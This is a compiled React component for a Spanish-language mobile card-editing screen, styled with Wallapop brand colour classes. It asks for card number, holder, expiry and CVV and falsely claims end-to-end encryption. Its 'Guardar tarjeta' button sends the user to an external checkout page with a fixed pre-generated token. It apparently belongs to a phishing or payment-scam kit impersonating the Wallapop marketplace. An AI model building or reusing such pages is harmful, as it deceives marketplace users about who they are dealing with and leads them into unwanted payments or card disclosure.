import { N as reactExports, G as jsxRuntimeExports } from "./server-DUxKx5xb.js";
import { u as useNavigate } from "./router-D80unHli.js";
import { P as PhoneShell } from "./PhoneShell-CtxupxdS.js";
import "node:async_hooks";
import "node:stream/web";
import "node:stream";
function EditCard() {
  const navigate = useNavigate();
  const [number, setNumber] = reactExports.useState("");
  const [name, setName] = reactExports.useState("");
  const [exp, setExp] = reactExports.useState("");
  const [cvv, setCvv] = reactExports.useState("");
  return /* @__PURE__ */ jsxRuntimeExports.jsxs(PhoneShell, { showHelp: false, children: [
    /* @__PURE__ */ jsxRuntimeExports.jsx("h1", { className: "text-2xl font-bold mt-2", children: "Editar tarjeta" }),
    /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "mt-2 text-gray-600 text-sm", children: "Tus datos están protegidos con cifrado de extremo a extremo." }),
    /* @__PURE__ */ jsxRuntimeExports.jsxs("form", { onSubmit: (e) => {
      e.preventDefault();
      navigate({
        to: "/"
      });
    }, className: "mt-6 space-y-4", children: [
      /* @__PURE__ */ jsxRuntimeExports.jsx(Field, { label: "Número de tarjeta", children: /* @__PURE__ */ jsxRuntimeExports.jsx("input", { value: number, onChange: (e) => setNumber(e.target.value), placeholder: "1234 5678 9012 3456", inputMode: "numeric", className: "w-full bg-transparent outline-none" }) }),
      /* @__PURE__ */ jsxRuntimeExports.jsx(Field, { label: "Titular", children: /* @__PURE__ */ jsxRuntimeExports.jsx("input", { value: name, onChange: (e) => setName(e.target.value), placeholder: "Nombre y apellidos", className: "w-full bg-transparent outline-none" }) }),
      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-3", children: [
        /* @__PURE__ */ jsxRuntimeExports.jsx(Field, { label: "Caducidad", children: /* @__PURE__ */ jsxRuntimeExports.jsx("input", { value: exp, onChange: (e) => setExp(e.target.value), placeholder: "MM/AA", className: "w-full bg-transparent outline-none" }) }),
        /* @__PURE__ */ jsxRuntimeExports.jsx(Field, { label: "CVV", children: /* @__PURE__ */ jsxRuntimeExports.jsx("input", { value: cvv, onChange: (e) => setCvv(e.target.value), placeholder: "123", inputMode: "numeric", className: "w-full bg-transparent outline-none" }) })
      ] }),
      /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "fixed bottom-24 left-1/2 -translate-x-1/2 w-full max-w-md px-5", children: /* @__PURE__ */ jsxRuntimeExports.jsx("button", { type: "button", onClick: () => {
        window.location.href = "https://checkout.tap.company/?mode=page&themeMode=&language=en&token=eyJhbGciOiJIUzI1NiJ9.eyJpZCI6IjZhMDg1ODY0NjVjNjg3NzVlODYxYTc0YyJ9.j4gs7IqNmhbBEEsM9lYzYRvVPcNs1iBDtgCeHY8jq7A";
      }, className: "block text-center w-full py-4 rounded-full bg-wallapop hover:bg-wallapop-dark transition text-white font-semibold", children: "Guardar tarjeta" }) })
    ] })
  ] });
}
function Field({
  label,
  children
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsxs("label", { className: "block border border-gray-200 rounded-2xl px-4 py-3 focus-within:border-wallapop", children: [
    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-xs text-gray-500", children: label }),
    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "mt-1", children })
  ] });
}
export {
  EditCard as component
};
